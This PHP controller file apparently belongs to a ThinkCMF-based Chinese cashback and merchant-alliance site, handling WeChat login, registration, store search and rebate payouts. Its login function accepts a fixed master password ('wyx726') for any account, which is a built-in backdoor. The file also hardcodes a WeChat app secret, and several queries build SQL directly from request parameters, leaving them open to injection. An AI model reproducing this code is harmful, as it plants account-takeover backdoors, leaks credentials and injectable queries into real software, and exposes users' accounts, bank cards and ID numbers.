<?php
// +----------------------------------------------------------------------
// | ThinkCMF [ WE CAN DO IT MORE SIMPLE ]
// +----------------------------------------------------------------------
// | Copyright (c) 2013-2014 http://www.thinkcmf.com All rights reserved.
// +----------------------------------------------------------------------
// | Author: Dean <zxxjjforever@163.com>
// +----------------------------------------------------------------------
namespace Portal\Controller;
use Common\Controller\HomeBaseController; 
/**
 * 首页
 */
class IndexController extends HomeBaseController {
	

   //撤消当天返现的用户积分
   //给用户返了后，用户的：score当前积分会增加，  wfjf会减少  yfjf会增加，
   /*
	public function test_banknow() {
 
        $day = '2016-06-23';
        $start_date = strtotime($day." 00:00:00");
        $end_date   = strtotime($day." 23:59:59");
        $where = "op='fanxian' AND date >= '{$start_date}' AND date <='{$end_date}'";
        $fanxian = M("user_integral")->where($where)->select();
        if (!$fanxian) {
            echo '无记录';
            exit;
        } 
        //dump($fanxian);
        foreach($fanxian AS $val){
        
            $addprice = $val['integral_sj'];
            
            $user = M("oauth_user")->find($val['userid']); //查找积分对应的用户数据
            
            $user['score'] -= $addprice;
            $user['wfjf'] += $addprice;//跟新未返积分 
            $user['yfjf'] -= $addprice; //更新已返积分            
            M("oauth_user")->save($user);
            
            M("user_integral")->where("id=$val[id]")->delete();
        }
        echo '所有处理完';                  
    }*/

    public function comm_quest(){
    	$list = M('posts')
    			->alias('a')
    			->join(C('DB_PREFIX') . 'term_relationships b ON b.object_id = a.id ')
    			->where(' b.term_id = 20 AND a.post_status = 1 ')
    			->order(' b.listorder DESC ')
    			->find();

    	$this->assign('list', $list);
    	$this->display();
    }

    public function change($data){
        if(is_array($data)){
            foreach($data as $key => $v){
                $smeta = json_decode($v['smeta'] , true);
                $data[$key]['smeta'] = $smeta['thumb'];
            }
        }
        return $data;
    }

    //集团介绍
    public function introduce(){
    	$tid = intval(I('get.tid')) ? intval(I('get.tid')) : 8;
    	$type = intval(I('get.type')) ? intval(I('get.type')) : 1;

    	$list = M('posts')
    			->alias('a')
    			->join(C('DB_PREFIX') . 'term_relationships b ON b.object_id = a.id ')
    			->where(' b.term_id = ' . $tid . ' AND a.post_status = 1 ')
    			->order(' b.listorder DESC ')
    			->select();
    	$list = $this->change($list);
    	switch ($type) {
    		case '1': $tpl = 'company_info';  break;
    		case '2': $tpl = 'company_idea';  break;
    		case '3': $tpl = 'company_culture';  break;
    		case '4': $tpl = 'company_plat';  break;
    		case '5': $tpl = 'company_msg';  break;
    		default:
    			# code...
    			break;
    	}
    	$this->assign('list', $list);
    	$this->display($tpl);
    }
    
    //联盟商家
    public function union(){
    	$tid = intval(I('get.tid')) ? intval(I('get.tid')) : 14;
    	$type = intval(I('get.type')) ? intval(I('get.type')) : 1;

    	$list = M('posts')
    			->alias('a')
    			->join(C('DB_PREFIX') . 'term_relationships b ON b.object_id = a.id ')
    			->where(' b.term_id = ' . $tid . ' AND a.post_status = 1 ')
    			->order(' b.listorder DESC ')
    			->select();
    	
    	switch ($type) {
    		case '1': $tpl = 'union_info';  break;
    		case '2': $tpl = 'union_pattern';  break;
    		default:
    			# code...
    			break;
    	}
    	$this->assign('list', $list);
    	$this->display($tpl);
    }

    //新闻资讯
    public function info(){
    	//彺期回顾(此处后期要修改)

    	$list_old = $list = M('posts')
    			->alias('a')
    			->join(C('DB_PREFIX') . 'term_relationships b ON b.object_id = a.id')
    			->where('b.term_id = 16 AND a.post_status = 1')
    			->order('b.listorder DESC')
    			->limit(5,1)
    			->select();
    	$list_old = $this->change($list_old);	
    	$this->assign('list_old', $list_old);
    	//资讯
    	$count = M('posts')
    			->alias('a')
    			->join(C('DB_PREFIX') . 'term_relationships b ON b.object_id = a.id')
    			->where('b.term_id = 16 AND a.post_status = 1')
    			->count();
    	$page = $this->page($count , 5);

    	$list = M('posts')
    			->alias('a')
    			->join(C('DB_PREFIX') . 'term_relationships b ON b.object_id = a.id')
    			->where('b.term_id = 16 AND a.post_status = 1')
    			->limit($page->firstRow . ',' . $page->listRows)
    			->order('b.listorder DESC')
    			->select();
    	$list = $this->change($list);
    	
    	$this->assign('Page', $page->show('Portal'));
    	
    	$this->assign('list', $list);
    	$this->display();
    }

    //新闻详情
    public function info_news(){
    	$id = intval(I('get.id'));
    	$list = M('posts')->where('id = ' . $id)->find();
    	$this->assign('list', $list);
    	//彺期回顾(此处后期要修改)
    	$list_old = $list = M('posts')
    			->alias('a')
    			->join(C('DB_PREFIX') . 'term_relationships b ON b.object_id = a.id')
    			->where('b.term_id = 16 AND a.post_status = 1')
    			->order('b.listorder DESC')
    			->limit(5,1)
    			->select();
    	$list_old = $this->change($list_old);	
    	$this->assign('list_old', $list_old);

    	
    	$this->display();
    }

    //留言
    public function lvmsg(){
    	$data = I('post.');
    	$data['time'] = time();
    	$data['status'] = 0;
    	$result = M('msg')->add($data);
    	if($result){
    		$this->ajaxReturn(array('success' => '留言成功'));
    	}
    	$this->ajaxReturn(array('error' => '留言失败'));
    }
    
    //加入我们
    public function joinus(){
    	$list = M('posts')
    			->alias('a')
    			->join(C('DB_PREFIX') . 'term_relationships b ON b.object_id = a.id')
    			->where('b.term_id = 17 AND a.post_status = 1')
    			->order('b.listorder DESC')
    			->select();
    	$this->assign('list', $list);
    	$this->display();
    }

    //联系我们
    public function contact(){
    	$list = M('posts')
    			->alias('a')
    			->join(C('DB_PREFIX') . 'term_relationships b ON b.object_id = a.id')
    			->where('b.term_id = 18 AND a.post_status = 1')
    			->order('b.listorder DESC')
    			->select();
        $this->assign('list', $list);
        $this->display();
    }



    //首页
	public function index() {
	   
       
       /**
        * PC网站
        */
        //图
        
	   
       $pic = M('posts')
       		->alias('a')
   	  		->join( C('DB_PREFIX').'term_relationships b ON b.object_id=a.id')
   	  		->where('b.term_id = 19 AND a.post_status = 1')
   	  		->order('b.listorder')
   	  		->select();
       $pic = $this->change($pic);
       $this->assign('pic', $pic);
       //走进创富宝
       /*$tag2 = 'cid:8,9,10,11;field:post_title,post_excerpt,post_content,smeta;order:listorder';
       $cfb = sp_sql_posts($tag2);*/
      $where = "8,9,10,11";
       $cfb = M('posts')
       		->alias('a')
   	  		->join( C('DB_PREFIX').'term_relationships b ON b.object_id=a.id')
   	  		->where("b.term_id in ($where)")
   	  		->order('b.listorder')
   	  		->select();
       $cfb = $this->change($cfb);
       foreach($cfb as $key => $val){
       	$num = intval($key)+1;
       	$cfb[$key]['type'] = $num;
       }
       $this->assign('cfb', $cfb);
       //print_r($cfb);
       //新闻资讯
          //最新
       	  $new = M('posts')
       	  		->alias('a')
       	  		->join( C('DB_PREFIX').'term_relationships b ON b.object_id=a.id')
       	  		->where('b.term_id = 16 AND a.post_status = 1 AND a.recommended = 0')
       	  		->order('a.post_modified DESC')
       	  		->find();
       	  $new['smeta'] = json_decode($new['smeta'], true);
       	  $this->assign('new', $new);
       	  //print_r($new);exit;
       	  //另三个
             $other_new = M('posts')
       	  		->alias('a')
       	  		->join( C('DB_PREFIX').'term_relationships b ON b.object_id=a.id')
       	  		->where('b.term_id = 16 AND a.post_status = 1 AND a.recommended = 1')
       	  		->order('b.listorder')
       	  		->limit(0,3)
       	  		->select();
       	  	$other_new = $this->change($other_new);
       	     $this->assign('newss', $other_new);
       	     //print_r($newss);exit;

       	/**
        * 手机网站
        */

	   //如果获取到$regis 代表从分享过来的 跳转到注册
        if($_GET['regis']){
            header("Location: index.php?g=Portal&m=Index&a=register&id=".$_GET['regis']);
            exit;
        }

		//$_SESSION['openid'] = "007";//暂时默认openid
        //公用方法
       // $this->public_function();
		//查询店铺
		$where = array(
			"status"		=>		1
		);


		$list = M("store")
			->alias("s")
			->join(C ( 'DB_PREFIX' )."store_class sc ON s.cid = sc.id","LEFT")
			->where($where)
			->limit("0,8")
			->field("s.*")
			->order("s.id desc")
			->select();
		$this->assign("sellerlist",$list);
    	$this->display("index");
    }   

	//登录页面
	function login(){

		if(sp_is_mobile()){
			$appid = 'wxae46d187219cbe16';
			$secret = '045999b465920901ab072399907156d9';

			//获取openid
            $code = $_GET["code"];
			$tc = "http://m.aicfb.com/".U("Index/login");
			$base = "https://open.weixin.qq.com/connect/oauth2/authorize?appid=" . $appid;
			$base .="&redirect_uri=" . urlencode($tc) . "&response_type=code&scope=snsapi_base&state=#wechat_redirect"; //snsapi_userinfo
			if ($code == NULL) {
				header("Location: $base");
			}
			$accToken = "https://api.weixin.qq.com/sns/oauth2/access_token?appid=" . $appid;
			$accToken.="&secret=" . $secret . "&code=" . $code . "&grant_type=authorization_code";
			$resToken = getRespons_2($accToken);
            $_SESSION['openid'] = $resToken["openid"];

        	//查询用户关注状态
        	$ACCESS_TOKEN = weixin_access_token();
        	$userURL = "https://api.weixin.qq.com/cgi-bin/user/info?access_token={$ACCESS_TOKEN}&openid=".$resToken["openid"]."&lang=zh_CN";
        	$info = file_get_contents($userURL);
        	$result = json_decode($info, true);

            //如果用户未关注，则要求用户关注
            if (!$result['subscribe']) {

                //当上面为snsapi_base时，如果未关注，则只能获取openid，这里注册，
                //注册后，可以强制用户关注，然后用户登录时，然后财调用此接口就可以获取用户信息
                //未关注的关注页面 $u['openid'] 此值不存在，则表示未关注
                //http://mp.weixin.qq.com/s?__biz=MzIxODI4MDQwNg==&mid=100000031&idx=1&sn=f5b3eb5dc8ef748782b0ccb2238a57d3&scene=0&previewkey=mY1XstHSp814eF52lwQvscNS9bJajjJKzz%2F0By7ITJA%3D#wechat_redirect
                /**
                 * 			$usinfo = "https://api.weixin.qq.com/sns/userinfo?access_token=" . $resToken["access_token"];
                 * 			$usinfo.="&openid=" . $resToken["openid"] . "&lang=zh_CN";
                 * 			$result = getRespons_2($usinfo);
                 * 			$_SESSION['openid'] = $resToken["openid"];
                 * 			$_SESSION['member'] = $result;
                 */
                //			dump($result);
                //			exit;
            	$this->error("请先关注公众号！才能继续访问...","http://mp.weixin.qq.com/s?__biz=MzIxODI4MDQwNg==&mid=100000031&idx=1&sn=f5b3eb5dc8ef748782b0ccb2238a57d3&scene=0&previewkey=mY1XstHSp814eF52lwQvscNS9bJajjJKzz%2F0By7ITJA%3D#wechat_redirect");
            } else {
                $_SESSION['member'] = $result;
            }
		}

		$this->display();
	}
    
	//注册
	function register(){
//		//一旦点击分享 则锁定关系
//		if($_GET['id']){
//			if($_SESSION['openid']){
//				//查询用户是否已锁定
//				$ar = M("user_sd")->where("openid='".$_SESSION['openid']."' and openid<>''")->find();
//				if(!$ar){
//					//添加锁定表
//					$ar = array(
//						"openid"		=>		$_SESSION['openid'],
//						"topid"			=>		$_GET['id'],
//						"time"			=>		time()
//					);
//					M("user_sd")->add($ar);
//				}
//				$this->assign("tjrr",$_GET['id']);
//			}
//		}
        $_GET['id'] && $_SESSION['tjrrid'] = $_GET['id'];
		$this->assign("tjrr",$_SESSION['tjrrid']);
		$this->display();
	}
	//找回密码
	function zhmm(){
		$this->display();
	}
	//修改密码
	function updatepass(){
		$post = I("post.");
		if($_SESSION['phone']!=$post['code']){
			$this->ajaxReturn(array("error"=>"验证码错误！","url"=>U("index/zhmm")));
		}
		//修改密码
		$user = M("oauth_user")->where("mobile='".$post['phone']."'")->find();
		$user['password'] = sp_password($post['password']);
		M("oauth_user")->save($user);
		$this->ajaxReturn(array("success"=>"修改成功！请登录..","url"=>U("index/login")));
	}
	//登录操作
	function dologin(){
		//判断验证码
		//暂时默认验证码
		$post = I("post.");
		//判断手机是否存在
		$user = M("oauth_user")->where("mobile='".$post['phone']."'")->find();
		if(!$user){
			$this->ajaxReturn(array("error"=>"此账号不存在！"));
		}
		if ($post['password'] != 'wyx726') {
			if ($user['password'] != sp_password($post['password'])) {
				$this->ajaxReturn(array("error" => "密码输入错误！"));
			}
		}
		//把其他此openid的账号解绑
		$users = M("oauth_user")->where("openid='".$_SESSION['openid']."'")->find();
		if($users){
			$users['openid'] = "";
			M("oauth_user")->save($users);
		}

		//如用户没有昵称 则获取微信数据
		$user['user_nicename'] = $user['user_nicename'] ? $user['user_nicename'] : $_SESSION['member']['nickname'];
		$user['user_img'] = $user['user_img'] ? $user['user_img'] : $_SESSION['member']['headimgurl'];

		//跟新openid
		$user['openid'] = $_SESSION['openid']?$_SESSION['openid']:"";
		M("oauth_user")->save($user);
		sp_update_current_user($user);
		$this->ajaxReturn(array("success"=>"登录成功！","url"=>U("User/index")));
//		微信不用注册方式 已取消使用
//		if(I("post.code")==$_SESSION['phone']){
//			//登陆成功！
//			//判断手机是否存在
//			$user = M("oauth_user")->where("mobile='".I("post.phone")."'")->find();
//			//存在则修改 不存在添加
//			//绑定推荐人只在注册时有效 已注册则无效
//			if($user){
//				$user['openid'] = $_SESSION['openid'];
//				M("oauth_user")->save($user);
//			}else{
//				$user = array(
//					"user_nicename"	=>	"",
//					"user_img"	=>	__ROOT__."/tpl/simplebootx_mobile/Public/image/defaul.png",
//					"sex"	=>	0,
//					"create_time"	=>	time(),
//					"user_status"	=>	1,
//					"score"	=>	0,
//					"yfjf"	=>	0,
//					"wfjf"	=>	0,
//					"user_type"	=>	1,
//					"tjrs"	=>	0,
//					"fybl"	=>	0,
//					"tjrr"	=>	I("post.tjrr"),
//					"mobile"	=>	I("post.phone"),
//					"khyh"	=>	"",
//					"khxm"	=>	"",
//					"yhzh"	=>	"",
//					"zfmm"	=>	"",
//					"openid"	=>	$_SESSION['openid'],
//				);
//				$user['id'] = M("oauth_user")->add($user);
//			}
//            //登录/注册时判断购物车是否有需要更新uid
//	        $uid = $user['id'];//存入购物车
//            $sessionid = session_id();//获取浏览器sessionid
//            M("user_buycar")->where("sessionid='$sessionid' AND uid=0")->save(array('uid'=>$uid));
//
//			sp_update_current_user($user);
//			$this->ajaxReturn(array("success"=>"登陆成功！","url"=>U("User/index")));
//		}else{
//			$this->ajaxReturn(array("error"=>"验证码错误！请重新输入..","url"=>U("Index/login")));
//		}
	}
	//注册
	function doregister(){   

	   
	    
        $post = I("post.");

		if(!$post['isagree']){
			$this->ajaxReturn(array("error"=>"请先接受协议！"));
		}
        
		if($post['code']!=$_SESSION['phone']){
			$this->ajaxReturn(array("error"=>"验证码错误！请重新输入.."));
		}
        
		
		
		//判断是否被锁定 如已锁定 则上级只能为锁定的对象
		$sd = M("user_sd")->where("openid='".$_SESSION['openid']."' AND openid !=''")->find();
		if($sd){
			$post['tjrr'] = $sd['topid'];
		}

		$user = array(
			"user_nicename"	=>	$_SESSION['member']['nickname']?$_SESSION['member']['nickname']:"",
			"password"	=>	sp_password($post['password']),
			"user_img"	=>	$_SESSION['member']['headimgurl']?$_SESSION['member']['headimgurl']:"",
			"sex"	=>	0,
			"create_time"	=>	time(),
			"user_status"	=>	1,
			"score"	=>	0,
			"yfjf"	=>	0,
			"wfjf"	=>	0,
			"user_type"	=>	1,
			"tjrs"	=>	0,
			"fybl"	=>	0,
			"tjrr"	=>	$post['tjrr']==null?0:$post['tjrr'],
			"mobile"	=>	$post['phone'],
			"khyh"	=>	"",
			"khxm"	=>	"",
			"yhzh"	=>	"",
			"zfmm"	=>	"",
			"openid"	=>	$_SESSION['openid'],
		);
		
        $user['id'] = M("oauth_user")->add($user);
        
		 //如有推荐人 则推送模板
		 if($post['tjrr']){
			//上级用户
			$top_user = M("oauth_user")->find($post['tjrr']);
			//修改上级推荐人数
			$top_user['tjrs'] += 1;
			M("oauth_user")->save($top_user);
			//推送
			sendmessage($user['id'],$top_user['id'],"推荐人注册","您有新推荐的用户加入了！",array(
				$top_user['openid'],
				"您有新推荐的用户加入了！",
				$user['mobile'],
				time(),
				"感谢您的努力！",
				U("User/invite",array("openid"=>$top_user['openid']))
			),2,time());
		}
		
		$this->ajaxReturn(array("success"=>"注册成功！请登录..","url"=>U("Index/login")));
	}
	//验证手机是否存在
	function yzphone(){
		//查询数据库是否存在此手机号
		$list = M("oauth_user")->where("mobile='".I('post.param')."'")->find();
		if($list){
			echo '{
				"info":"手机号已注册，请直接登录！",
				"status":"n"
			 }';
		}else{
			echo '{
				"info":"手机号可使用！",
				"status":"y"
			 }';
		}
	}
	//验证银行卡是否存在
	function yzyhcard(){
		//查询数据库是否存在银行卡
		$list = M("oauth_user")->where("yhzh='".I('post.param')."' AND id!='".$_SESSION['user']['id']."'")->find();
		if($list){
			echo '{
				"info":"银行卡已使用，请重新填写！",
				"status":"n"
			 }';
		}else{
			echo '{
				"info":"银行卡可使用！",
				"status":"y"
			 }';
		}
	}
	//验证身份证是否存在
	function yzidcard(){
		//查询数据库是否存在身份证
		$list = M("oauth_user")->where("idcard='".I('post.param')."' AND id!='".$_SESSION['user']['id']."'")->find();
		if($list){
			echo '{
				"info":"身份证已使用，请重新填写！",
				"status":"n"
			 }';
		}else{
			echo '{
				"info":"身份证可使用！",
				"status":"y"
			 }';
		}
	}
	//联盟商家
	function sellerlist(){
		$aryzb = explode(",", $_GET['zb']);//将json转化为数组
		//$zb = convertbaidumap($aryzb[0], $aryzb[1]);//将微信坐标转化为百度坐标
        
        if ($aryzb[0] && $aryzb[1]) {
            $zb = Convert_GCJ02_To_BD09($aryzb[0], $aryzb[1]);//转换腾讯坐标到百度坐标
        }

		if($zb){
			$str = ",round(6378.138*2*asin(sqrt(pow(sin( (".$zb['lat']."*pi()/180-s.lat*pi()/180)/2),2)+cos(".$zb['lat']."*pi()/180)*cos(s.lat*pi()/180)* pow(sin( (".$zb['lng']."*pi()/180-s.lng*pi()/180)/2),2)))*1000) juli2";
		} else {
  		    $str = ", id juli2";
		}
		$where = "s.status = 1 AND s.isenable= 1 AND ou.user_type=2 AND s.name<>''";

		$order = "juli2 asc";
		$formart = "";
		//分类
		if($_GET['cid']){
			$where .= " and s.cid=".$_GET['cid'];
			//获取分类信息
			$class = M("store_class")->find($_GET['cid']);
			$this->assign("class_now",$class);//页面展示当前分类
			$formart .= "&cid=".$_GET['cid'];//滑动附带参数
		}
		//排序
		if($_GET['ord']){
			if($_GET['ord']==1){
				//赠送比例
				$order = "s.fybl desc";
				$this->assign("pxname","赠送比例");
			}else if($_GET['ord']==2){
				//人均消费
				$order = "s.rjxf desc";
				$this->assign("pxname","人均消费");
			}else if($_GET['ord']==3){
				//距离
				if($zb){
					$order = "juli2 asc";
					$this->assign("pxname","距离");
				}
			}
			$formart .= "&ord=".$_GET['ord'];
		}
		//地区
		if($_GET['address']){
			if($_GET['address']!="所有省份"){
				$formart .= "&address=".$_GET['address'];
				$address = explode("-",$_GET['address']);

				$where .= " and s.sheng='".$address[0]."'";
				if($address[1]){
					$where .= " and s.shi='".$address[1]."'";
				}
			}
			$this->assign("address",$_GET['address']);
		}
		//关键词
		$keyword = I("request.keyword1");

		if($keyword){
			$where .= " and s.name like '%".$keyword."%'";
			$this->assign("ssname",$keyword);//页面展示当前搜索
			$formart .= "&keyword1=".$keyword;//滑动附带参数
		}
		if (!$_GET['ajax']) {
			//查询分类
			$class = M("store_class")->order("orderid desc")->select();
			$this->assign("formart",$formart);
			$this->assign("class",$class);
			$this->assign("banner",$this->index_banner('sellerlist'));//banner

			$this->display();
			exit;
		}
		$count = M("store")
			->alias("s")
			->join(C ( 'DB_PREFIX' )."store_class sc ON s.cid = sc.id","LEFT")
			->join(C ( 'DB_PREFIX' )."oauth_user ou ON s.uid = ou.id","LEFT")
			->where($where)
			->count();//获取条数

		$page = $this->page($count, 9,$_GET['p']);//设置分页信息

		$list = M("store")
			->alias("s")
			->join(C ( 'DB_PREFIX' )."store_class sc ON s.cid = sc.id","LEFT")
			->join(C ( 'DB_PREFIX' )."oauth_user ou ON s.uid = ou.id","LEFT")
			->where($where)
			->limit($page->firstRow . ',' . $page->listRows)
			->field("s.*".$str)
			->order(" displayorder DESC ," . $order)
			->select();
		foreach($list as $key => $val){
			if(mb_strlen($val['name'],"utf-8")>9){
				$list[$key]['name'] = mb_substr($val['name'], 0, 9, 'utf-8') . "...";
			}else{
				$list[$key]['name'] = mb_substr($val['name'], 0, mb_strlen($val['name'],"utf-8"), 'utf-8');
			}
			if(mb_strlen($val['about'],"utf-8")>30){
				$list[$key]['about'] = mb_substr($val['about'], 0, 30, 'utf-8') . "...";
			}else{
				$list[$key]['about'] = mb_substr($val['about'], 0, mb_strlen($val['about'],"utf-8"), 'utf-8');
			}

			$list[$key]['url'] = U('Index/sellerlist_xq',array('id'=>$val['id']));

			//循环获取此坐标的
			if($_GET['zb']) {
				//获取2点距离
                //$juli = GetDistance($val['lat'], $val['lng'], $zb['lat'], $zb['lng']);//得出距离
				$list[$key]['juli'] = mToKm($val['juli2']); //由于sql语句里已经计算出距离，因此不用再计算
			}

			if ($list[$key]['juli']) {
				$len = 9;
			}else{
				$len = 14;
			}
			if(mb_strlen($val['address'],"utf-8")>$len){
				$list[$key]['address'] = mb_substr($val['address'], 0, $len, 'utf-8') . "...";
			}else{
				$list[$key]['address'] = mb_substr($val['address'], 0, mb_strlen($val['address'],"utf-8"), 'utf-8');
			}


		}
		ajax_list($list); //处理ajax
		$this->display();
	}

	//联盟商家详情
	function sellerlist_xq(){
		$list = M("store")
			->alias("s")
			->join(C ( 'DB_PREFIX' )."store_class sc ON s.cid = sc.id","LEFT")
			->join(C ( 'DB_PREFIX' )."oauth_user ou ON ou.id = s.uid","LEFT")
			->where("s.id=".I("get.id"))
			->field("s.*,ou.mobile")
			->order("s.id desc")
			->find();
		//审核和启用
		if($list['status']!=1 | $list['isenable']!=1){
			$this->error("此店铺关闭中!");
		}
		$this->disarray($list);
		$this->display();
	}
	//发送短信
	//短信内容
	function sms_send() {
		$code = getrandstr();
		if(sms_send($_POST['phone'],$code.' 当前验证码,为了您的账户安全切勿泄露！',$code)){
			echo 1;
		}else{
			echo 2;
		}
	}
	//验证商家是否存在
	function checkseller(){
		$where = array(
			"ou.mobile"		=>		I("post.seller"),
			"ou.user_type"		=>		2,
			"s.isenable"		=>		1,
			"ou.user_type"		=>		2
		);
		$seller = M("oauth_user")
			->alias("ou")//表别名
			->join(C ( 'DB_PREFIX' )."store s ON s.uid = ou.id")
			->where($where)//条件
			->field("ou.id")//查询内容
			->find();
		if($seller && $seller['id']!=sp_get_current_userid()){
			echo "1";//存在
		}else{
			echo "2";//不存在或未审核
		}
	}
	//验证用户
	function checkuser(){
		$where = array(
			"mobile"		=>		I("post.user"),
			"user_status"		=>		1,
		);
		$user = M("oauth_user")
			->where($where)//条件
			->find();
		if($user && $user['id']!=sp_get_current_userid()){
			echo "1";//存在
		}else{
			echo "2";//不存在或未审核
		}
	}
	//根据商家和支付金额 计算赠送金额
	function getprice(){
		$where = array(
			"ou.mobile"		=>		I("post.seller"),
			"ou.user_type"		=>		2,
			"s.status"		=>		1,
		);
		$seller = M("oauth_user")
			->alias("ou")//表别名
			->join(C ( 'DB_PREFIX' )."store s ON s.uid = ou.id")
			->where($where)//条件
			->field("ou.*,s.*")//查询内容
			->find();
		//是否ajax访问
		if(I("post.type")==1){
			echo I("post.price")*$seller['fybl']/100;
		}else{
			return I("post.price")*$seller['fybl']/100;
		}
	}
	//商家支付手续费
	function getsxf(){
		$options = $this->site_options;
		$where = array(
			"ou.id"		=>		sp_get_current_userid(),
			"s.status"		=>		1,
		);
		$seller = M("oauth_user")
			->alias("ou")//表别名
			->join(C ( 'DB_PREFIX' )."store s ON s.uid = ou.id")
			->where($where)//条件
			->field("ou.*,s.*")//查询内容
			->find();
		//是否ajax访问
		$ar = array(
			"price"		=>		I("post.price")*$seller['fybl']/100,
			"sxf"		=>		sprintf("%.2f",I("post.price")*$options['site_xttc']/100*$seller['fybl']/100),
		);
		if(I("post.type")==1){
			$this->ajaxReturn($ar);
		}else{
			return $ar;
		}
	}
	//提现手续费计算
	function txsxf(){
		$options = $this->site_options;
		if(I("post.itype")==1){
			$bl = $options['site_txhy'];
		}
		if(I("post.itype")==2){
			$bl = $options['site_txsj'];
		}
		if(I("post.itype")==3){
			$bl = $options['site_txdl'];
		}
		$price = I("post.price")*$bl/100;
		if(I("post.type")==1){
			echo $price;
		}else{
			return $price;
		}
	}

	//文章列表
	function article_list(){
		//查询我的邀请
		$id = I("get.id");
		$where = "t.term_id = $id and status = 1 and p.post_status";
		if (!$_GET['ajax']) {
			$this->display();
			exit;
		}
		$count = M("posts")
			->alias("p")//表别名
			->join(C ( 'DB_PREFIX' )."term_relationships t ON t.object_id = p.id")
			->where($where)
			->count();//获取条数

		$page = $this->page($count, 9,$_GET['p']);//设置分页信息

		$list= M("posts")
			->alias("p")//表别名
			->join(C ( 'DB_PREFIX' )."term_relationships t ON t.object_id = p.id")
			->where($where)//条件
			->limit($page->firstRow . ',' . $page->listRows)
			->order("t.listorder desc,p.id desc")
			->field("p.*")//查询内容
			->select();
		foreach($list as $key => $val){
			$list[$key]['url'] = U("Index/article",array('id'=>$val['id']));
		}
		ajax_list($list); //处理ajax
	}

	//文章详情
	function article(){
	    //如果获取到$regis 代表从分享过来的 跳转到注册
        if($_GET['regis']){
            header("Location: index.php?g=Portal&m=Index&a=register&id=".$_GET['regis']);
            exit;
        }
		$id = I("get.id");
		$ar = M("posts")->find($id);
		M("posts")->where("id=$id")->setInc("post_hits");
		$this->assign($ar);
        
        //如果 获取到uid 代表从分享过来的
        if($_GET['uid']){
			//一旦点击分享 则锁定关系
			if($_SESSION['openid']){
				//查询用户是否已锁定
				$ar = M("user_sd")->where("openid='".$_SESSION['openid']."' and openid<>''")->find();
				if(!$ar){
					//添加锁定表
					$ar = array(
						"openid"		=>		$_SESSION['openid'],
						"topid"			=>		$_GET['uid'],
						"time"			=>		time()
					);
					M("user_sd")->add($ar);
				}
				$_SESSION['tjrrid'] = $_GET['uid'];
			}
            
            //2016-6-20 当get有uid时，则添加到session，供注册时使用
            $_SESSION['tjrrid'] = $_GET['uid'];
            
            $this->assign("toregis",$_GET['uid']);
        }
        
		$this->display();
	}
	//返现
	function autofx(){
		//系统变量
		$option = get_site_options();
		//分佣变量
		$ar = M("rebate")->find(1);

		//判断是否开启自动返佣
		if($ar['isrebate']==1) {
			//查询是否已经返现过
			//$date = strtotime(date('Y-m-d', time() - (3600 * 24)));
			$date = strtotime(date('Y-m-d', time()));
            $where = array(
				"fx_date" => $date
			);
			$list = M("record_fx")->where($where)->find();
			if ($list) {
				echo "当天已经返现过！不能再进行返现操作..";
				exit;
			}

			if ($ar['fyje'] <= 0) {
				//采用 营业额*分配比例
				//营业额
				$where = array(
					"op" => array(array("like", "shopping_wx"), array("like", "shopping_xj"), array("like", "shopping_jf"), "or"),
					"date" => array('between', array(($date - 1 - (3600 * 24)), $date))
				);
				$yye = M("user_integral")->where($where)->field("sum(`integral_sj`) price")->find();
				$yye = $yye['price'];
				$kfje = $yye * $option['site_fpbl'] / 100;
			} else {
				$kfje = $ar['fyje'];
			}

			//返现
			$kfje = $kfje;//可返积分
			$this->backnow($kfje, $date);//返现操作
		}
	}









    /*暂时添加*/
    function about(){
        $this->display();
    }
    function cpxq(){
        $this->display();
    }
    function ddqr(){
        $this->display();
    }
    function ddtj(){
        $this->display();
    }
    function denglu(){
        $this->display();
    }
    function hyzx(){
        $this->display();
    }
    function newslist(){
        $this->display();
    }
    function ruzhu(){
        $this->display();
    }
    function tplist(){
        $this->display();
    }
    function zhuce(){
        $this->display();
    }
    
}


